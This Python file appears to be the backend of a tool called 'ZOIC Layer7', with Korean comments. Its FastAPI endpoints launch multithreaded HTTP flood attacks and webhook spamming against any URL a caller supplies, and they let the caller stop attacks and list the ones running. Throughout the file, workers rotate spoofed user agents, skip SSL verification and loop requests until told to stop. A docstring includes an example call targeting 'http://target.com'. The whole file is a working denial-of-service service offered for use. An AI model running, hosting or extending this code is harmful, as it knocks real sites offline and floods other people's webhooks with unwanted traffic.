# filename: main.py
import os
import sys
import urllib.request
import urllib.parse
import urllib.error
import threading
import random
import time
import ssl
import json
import socket
import logging
import uuid
import asyncio

from fastapi import FastAPI, HTTPException, BackgroundTasks, Query
from pydantic import BaseModel, HttpUrl, Field
from typing import Dict, Optional

# 로깅 설정 (로그를 콘솔에 출력하도록 구성)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# --- 공격 상태 관리를 위한 전역 변수 ---
# 활성화된 공격 이벤트를 저장하여 중지할 수 있도록 합니다.
active_attacks: Dict[str, threading.Event] = {}

# --- User Agents (원본 스크립트와 동일) ---
user_agent = [
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57",
    "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
    "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0",
    "Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)"
]

# --- FastAPI 앱 초기화 ---
app = FastAPI(
    title="ZOIC Layer7 백엔드",
    description="HTTP Flood, Webhook Spamming, URL 콘텐츠 로딩을 위한 백엔드 서비스입니다. CLI 스타일의 숫자 엔드포인트를 지원합니다.",
    version="4.5"
)

# --- 요청 유효성 검사를 위한 Pydantic 모델 ---
class HTTPFloodRequest(BaseModel):
    url: HttpUrl = Field(..., description="HTTP Flood 공격 대상 URL.")
    threads: int = Field(..., gt=0, description="공격에 사용할 스레드 수. 0보다 커야 합니다.")

class WebhookSpamRequest(BaseModel):
    url: HttpUrl = Field(..., description="메시지를 보낼 웹훅 URL.")
    message: str = Field(..., min_length=1, description="웹훅으로 보낼 메시지 내용. 비워둘 수 없습니다.")
    threads: int = Field(..., gt=0, description="스팸에 사용할 스레드 수. 0보다 커야 합니다.")

# --- 핵심 공격 함수 (백엔드 실행을 위해 수정됨) ---

def _send_http_request_worker(url: str, stop_event: threading.Event, attack_id: str):
    """단일 HTTP 플러드 스레드를 위한 워커 함수."""
    headers = {
        "User-Agent": random.choice(user_agent),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Connection": "close"
    }
    context = ssl._create_unverified_context() # 원본 스크립트처럼 SSL 인증서 오류 무시
    
    while not stop_event.is_set():
        try:
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=3, context=context) as response:
                logger.info(f"[HTTP Flood | {attack_id}] 대상: {url} | 상태: {response.getcode()}")
        except urllib.error.HTTPError as e:
            logger.warning(f"[HTTP Flood | {attack_id}] 실패: {url} | 코드: {e.code} | 이유: {e.reason}")
            time.sleep(1)
        except urllib.error.URLError as e:
            logger.error(f"[HTTP Flood | {attack_id}] 실패: {url} | 이유: {e.reason} (서버 다운 또는 잘못된 URL?)")
            time.sleep(1)
        except socket.timeout:
            logger.warning(f"[HTTP Flood | {attack_id}] 타임아웃: {url}")
            time.sleep(1)
        except Exception as e:
            logger.critical(f"[HTTP Flood | {attack_id}] 예상치 못한 오류: {url} | 메시지: {str(e)}")
            time.sleep(1)
    logger.info(f"[HTTP Flood | {attack_id}] 워커가 {url}에 대해 중지되었습니다.")

def _send_http_flood_task(url: str, threads: int, attack_id: str):
    """HTTP 플러드 공격 스레드를 관리합니다."""
    stop_event = threading.Event()
    active_attacks[attack_id] = stop_event
    
    thread_list = []
    logger.info(f"HTTP Flood [{attack_id}]를 {url}에 대해 {threads}개 스레드로 시작합니다.")
    for _ in range(threads):
        t = threading.Thread(target=_send_http_request_worker, args=(url, stop_event, attack_id))
        t.daemon = True # 메인 프로그램이 스레드가 실행 중이더라도 종료될 수 있도록 합니다.
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join() # 모든 스레드가 완료되거나 중지 이벤트가 설정될 때까지 기다립니다.
    
    logger.info(f"HTTP Flood [{attack_id}]가 {url}에 대해 완료되었거나 중지되었습니다.")
    if attack_id in active_attacks:
        del active_attacks[attack_id]

def _send_webhook_worker(url: str, message: str, stop_event: threading.Event, attack_id: str):
    """단일 웹훅 스팸 스레드를 위한 워커 함수."""
    headers = {
        "User-Agent": random.choice(user_agent),
        "Content-Type": "application/json"
    }
    data = json.dumps({"content": message}).encode('utf-8')
    context = ssl._create_unverified_context() # SSL 인증서 오류 무시
    
    while not stop_event.is_set():
        try:
            req = urllib.request.Request(url, data=data, headers=headers, method='POST')
            with urllib.request.urlopen(req, timeout=3, context=context) as response:
                logger.info(f"[Webhook Spam | {attack_id}] 대상: {url} | 상태: {response.getcode()}")
            time.sleep(0.1) # 일부 웹훅에서 공격적인 속도 제한을 피하기 위한 작은 지연
        except urllib.error.HTTPError as e:
            logger.warning(f"[Webhook Spam | {attack_id}] 실패: {url} | 코드: {e.code} | 이유: {e.reason}")
            time.sleep(1)
        except urllib.error.URLError as e:
            logger.error(f"[Webhook Spam | {attack_id}] 실패: {url} | 이유: {e.reason} (잘못된 웹훅 URL?)")
            time.sleep(1)
        except socket.timeout:
            logger.warning(f"[Webhook Spam | {attack_id}] 타임아웃: {url}")
            time.sleep(1)
        except Exception as e:
            logger.critical(f"[Webhook Spam | {attack_id}] 예상치 못한 오류: {url} | 메시지: {str(e)}")
            time.sleep(1)
    logger.info(f"[Webhook Spam | {attack_id}] 워커가 {url}에 대해 중지되었습니다.")

def _send_webhook_spam_task(url: str, threads: int, message: str, attack_id: str):
    """웹훅 스팸 공격 스레드를 관리합니다."""
    stop_event = threading.Event()
    active_attacks[attack_id] = stop_event

    thread_list = []
    logger.info(f"Webhook Spam [{attack_id}]를 {url}에 대해 {threads}개 스레드로 시작합니다.")
    for _ in range(threads):
        t = threading.Thread(target=_send_webhook_worker, args=(url, message, stop_event, attack_id))
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join()
    
    logger.info(f"Webhook Spam [{attack_id}]가 {url}에 대해 완료되었거나 중지되었습니다.")
    if attack_id in active_attacks:
        del active_attacks[attack_id]

async def _load_string_async(url: str) -> Optional[str]:
    """URL에서 콘텐츠를 비동기적으로 가져옵니다."""
    headers = {
        "User-Agent": random.choice(user_agent),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Connection": "close"
    }
    context = ssl._create_unverified_context() # SSL 인증서 오류 무시
    
    try:
        req = urllib.request.Request(url, headers=headers)
        # 메인 FastAPI 이벤트 루프를 차단하지 않도록 asyncio.to_thread를 사용하여
        # blocking urllib.request.urlopen을 별도의 스레드에서 실행합니다.
        response = await asyncio.to_thread(urllib.request.urlopen, req, timeout=5, context=context)
        with response as r:
            content = await asyncio.to_thread(r.read)
            return content.decode('utf-8', errors='ignore')
    except urllib.error.HTTPError as e:
        logger.error(f"콘텐츠 로드 실패: {url} | 코드: {e.code} | 이유: {e.reason}")
        raise HTTPException(status_code=e.code, detail=f"HTTP 오류: {e.reason}")
    except urllib.error.URLError as e:
        logger.error(f"콘텐츠 로드 실패: {url} | 이유: {e.reason} (서버 다운 또는 잘못된 URL?)")
        raise HTTPException(status_code=400, detail=f"URL 오류: {e.reason}")
    except socket.timeout:
        logger.error(f"콘텐츠 로드 타임아웃: {url}")
        raise HTTPException(status_code=408, detail=f"{url}에 대한 요청 타임아웃")
    except Exception as e:
        logger.critical(f"콘텐츠 로드 중 예상치 못한 오류: {url} | 메시지: {str(e)}")
        raise HTTPException(status_code=500, detail=f"예상치 못한 오류가 발생했습니다: {str(e)}")

# --- CLI 옵션과 일치하는 API 엔드포인트 ---

@app.post("/2", summary="HTTP Flood 공격 시작 (CLI 옵션 2)", response_model=Dict[str, str])
async def start_http_flood_endpoint(request: HTTPFloodRequest, background_tasks: BackgroundTasks):
    """
    지정된 URL에 대해 여러 스레드를 사용하여 HTTP Flood 공격을 시작합니다.
    이 엔드포인트는 CLI 옵션 '2'에 직접적으로 해당합니다.
    
    **요청 본문 (Request Body):**
    - `url`: 공격 대상 URL (예: `http://example.com`)
    - `threads`: 공격을 위한 동시 스레드 수 (예: `10`)
    
    **fetch 호출 예시:**
    ```javascript
    fetch("https://backendurl/2", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: "http://target.com", threads: 10 })
    })
    .then(response => response.json())
    .then(data => console.log(data));
    ```
    """
    attack_id = str(uuid.uuid4())
    background_tasks.add_task(_send_http_flood_task, str(request.url), request.threads, attack_id)
    return {"message": "HTTP Flood 공격이 백그라운드에서 시작되었습니다", "attack_id": attack_id, "target_url": str(request.url)}

@app.get("/3", summary="URL에서 콘텐츠 로드 (CLI 옵션 3)", response_model=Dict[str, str])
async def load_string_endpoint(url: HttpUrl = Query(..., description="콘텐츠를 가져올 URL.")):
    logger.info(f"{url}에서 콘텐츠를 로드합니다.")
    content = await _load_string_async(str(url))
    return {"url": str(url), "content": content}

@app.post("/4", summary="Webhook Spamming 시작 (CLI 옵션 4)", response_model=Dict[str, str])
async def start_webhook_spam_endpoint(request: WebhookSpamRequest, background_tasks: BackgroundTasks):
    attack_id = str(uuid.uuid4())
    background_tasks.add_task(_send_webhook_spam_task, str(request.url), request.threads, request.message, attack_id)
    return {"message": "Webhook Spamming이 백그라운드에서 시작되었습니다", "attack_id": attack_id, "target_url": str(request.url)}

@app.post("/attack/stop/{attack_id}", summary="ID로 실행 중인 공격 중지", response_model=Dict[str, str])
async def stop_attack(attack_id: str):
    """
    `attack_id`로 식별된 현재 실행 중인 HTTP Flood 또는 Webhook Spam 공격을 중지합니다.
    """
    if attack_id in active_attacks:
        stop_event = active_attacks[attack_id]
        stop_event.set()
        await asyncio.sleep(0.1) # 스레드가 중지 이벤트를 인식하도록 잠시 기다립니다.
        logger.info(f"공격 ID: {attack_id}에 대한 중지 신호가 전송되었습니다.")
        return {"message": f"ID {attack_id}를 가진 공격이 중지되고 있습니다."}
    raise HTTPException(status_code=404, detail=f"ID {attack_id}를 가진 활성 공격을 찾을 수 없습니다.")

@app.get("/attack/status", summary="활성 공격 상태 가져오기", response_model=Dict[str, list])
async def get_attack_status():
    """
    현재 활성화된 모든 공격 ID 목록을 반환합니다.
    """
    return {"active_attacks": list(active_attacks.keys())}

@app.get("/", summary="ZOIC Layer7 백엔드에 오신 것을 환영합니다", response_model=Dict[str, str])
async def read_root():
    """
    ZOIC Layer7 백엔드 API에 대한 환영 메시지입니다.
    """
    return {
        "message": "ZOIC Layer7 백엔드에 오신 것을 환영합니다! CLI 스타일 작업에는 /2, /3, /4를 사용하거나, 자세한 내용은 /docs를 확인하세요.",
        "version": app.version,
        "docs_url": "/docs",
        "redoc_url": "/redoc"
    }
